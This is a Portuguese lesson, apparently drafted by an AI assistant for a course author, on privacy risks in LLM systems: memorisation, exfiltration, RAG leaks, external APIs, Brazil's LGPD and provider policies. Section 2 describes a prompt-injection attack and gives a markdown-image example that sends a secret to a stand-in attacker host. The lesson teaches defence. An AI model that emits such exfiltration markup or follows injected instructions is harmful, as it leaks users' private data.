Aula 4 — Riscos de dados e privacidade em sistemas de LLM
1. Memorização de dados de treinamento e vazamento
O que é: durante o pré-treinamento (Aula 1), o modelo pode decorar trechos literais dos dados — especialmente sequências raras ou repetidas (um CPF, uma chave de API, um e-mail, texto protegido por direitos autorais).

Por que é risco: o modelo pode regurgitar esse dado memorizado para qualquer usuário depois. É a raiz do LLM02 (Sensitive Information Disclosure).

Exemplo: training data extraction attacks — pesquisadores conseguiram fazer modelos cuspirem números de telefone e endereços reais que estavam no treino. 🔎

O problema espinhoso: uma vez memorizado, é muito difícil "desaprender" — o que colide de frente com o direito de exclusão da LGPD (tópico 5).

Mitigação: deduplicar e fazer scrubbing de PII nos dados de treino, técnicas de differential privacy, filtro de saída. (Se você só consome uma API, não controla isso — você confia no provedor.)

2. Exfiltração de dados via interação com o modelo
O que é: diferente da memorização (que vaza dos pesos), aqui o dado vaza pelo contexto vivo do sistema — o atacante usa a interação para extrair o que o modelo tem acesso naquela sessão (contexto, RAG, ferramentas). O modelo vira um "vice comprometido" (confused deputy).

Por que é risco: combina LLM01 (injection) + LLM02.

Exemplo clássico — exfiltração via imagem markdown: uma injeção faz o modelo emitir ![](http://atacante.com/log?dados=SEGREDO). Quando a interface renderiza essa "imagem", o navegador faz a requisição → o servidor do atacante registra o segredo na query string. O dado saiu sem o usuário perceber. 🔎

Mitigação: filtrar/bloquear a saída (egress — não deixar o modelo emitir URLs externas arbitrárias), menor exposição no contexto (não colocar mais dados do que o necessário), menor privilégio, monitoramento.

3. Riscos de privacidade em RAG
O que é: como o RAG injeta documentos recuperados no contexto, ele cria caminhos de vazamento de privacidade. Aprofunda o LLM08 (Vector and Embedding Weaknesses).

Os riscos:

Vazamento entre usuários/tenants: controle de acesso fraco → o RAG devolve a um usuário um documento de outro.
Dado sensível na base: a própria base de conhecimento concentra PII que pode ser recuperada indevidamente.
Inversão de embedding: reconstruir o texto-fonte (PII) a partir do vetor armazenado.
Exemplo: um funcionário pergunta ao bot de RH e recebe de volta o salário de outro funcionário, porque o vector store não filtrava por permissão do usuário.

Mitigação: controle de acesso por usuário/tenant aplicado ANTES da recuperação (filtrar por permissão, não depois), minimizar dado sensível na base, scrubbing, auditoria de acessos.

4. Dados enviados a APIs externas de LLM
O que é: ao usar uma API proprietária (Aula 1), seus prompts e os dados neles saem da sua infraestrutura e vão para um terceiro.

Por que é risco (e compliance): o provedor pode logar, reter ou treinar com seus dados; os dados cruzam fronteiras (geralmente para os EUA); e passam a estar nos sistemas de um terceiro (sujeito a vazamento, subprocessadores, requisições legais).

Exemplo real: funcionários da Samsung colaram código-fonte confidencial em um chatbot consumer → o dado foi parar nos sistemas do provedor. 🔎 É o caso-escola de "shadow AI" corporativo.

Mitigação: minimização (não envie o que não precisa), anonimizar/redigir antes de enviar, usar planos enterprise/API com garantia de não-treino e retenção zero, controles de DLP, política + treinamento de funcionários, e considerar modelos open source self-hosted para dados muito sensíveis.

5. LGPD e IA: implicações regulatórias
O que é: a LGPD (Lei 13.709/2018) é a lei brasileira de proteção de dados — equivalente ao GDPR europeu. A autoridade é a ANPD.

Princípios da LGPD aplicados a LLMs:

Base legal: você precisa de uma base (consentimento, legítimo interesse etc.) para tratar dado pessoal — inclusive para mandá-lo a um LLM.
Finalidade + minimização: só tratar para um fim declarado, com o mínimo de dados. Jogar o registro inteiro do cliente no prompt "por garantia" viola isso.
Transparência: o titular precisa saber que seus dados são tratados (e por IA).
Direitos do titular: acesso, correção e exclusão → e aqui mora a tensão com a memorização (tópico 1): como apagar um dado que o modelo decorou?
Transferência internacional: enviar dado pessoal a um provedor nos EUA aciona as regras de transferência internacional.
Responsabilização: documentar decisões, e em casos de risco, um relatório de impacto (RIPD).
📌 Atenção, autor: além da LGPD, o Brasil discute um Marco Legal da IA (PL 2338) — vale você checar o status atual antes de gravar, pois pode ter avançado. 🔎 (Não vou afirmar o estágio de memória.)

Mitigação/compliance: definir base legal, minimizar/anonimizar, fazer RIPD, contrato de tratamento de dados (DPA) com o provedor, escolher provedores/regiões adequados.

6. Avaliando a política de uso de dados dos provedores
Em vez de decorar "o provedor X faz Y" (muda o tempo todo), aprenda o checklist do que perguntar a qualquer provedor:

Treina com meus dados? (o padrão costuma diferir entre consumer e API/enterprise).
Retenção: por quanto tempo guarda prompts/saídas? Existe retenção zero?
Subprocessadores: quem mais toca nos dados?
Região: onde os dados são processados/armazenados? Posso escolher a região?
Controles/opt-out: dá para desligar treino e logging?
Garantias contratuais: SOC 2 / ISO 27001, DPA, cláusulas de transferência internacional.
🔑 Regra prática: planos consumer frequentemente treinam por padrão; planos API/enterprise geralmente não treinam e oferecem controles. Para dado corporativo/pessoal, nunca use a versão consumer gratuita. E sempre leia os termos atuais — o que eu "lembro" pode estar desatualizado.

A história da Aula 4 (síntese)
Privacidade em LLM vaza por dois canais bem diferentes — e essa distinção é o coração da aula:

Canal	Onde o dado mora	Risco	Exemplo
Pelos pesos	dentro do modelo (treino)	Memorização (tópico 1)	modelo cospe um CPF que decorou
Pelo contexto vivo	na sessão/RAG/API (inferência)	Exfiltração, RAG, API externa (tópicos 2–4)	injeção dumpa dados de outro usuário
E por cima de tudo isso, duas camadas transversais: a lei (LGPD) define o que você pode fazer, e a política do provedor define o que acontece com o dado quando ele sai da sua mão.

✅ Checks de entendimento
Qual a diferença essencial entre memorização (tópico 1) e exfiltração (tópico 2)? (Dica: de onde o dado vaza — pesos × contexto?)
Por que o direito de exclusão da LGPD é tecnicamente difícil de cumprir num LLM que foi treinado com aquele dado?
Sua empresa quer usar um LLM para resumir contratos com dados pessoais de clientes. Cite duas medidas — uma técnica e uma de compliance — que você exigiria antes de aprovar.
Responde o que quiser (ou "não sei, me diga"). Depois seguimos para a Aula 5 (mitigações e controles), que é onde a gente sai do "o que dá errado" e entra no "como blindar".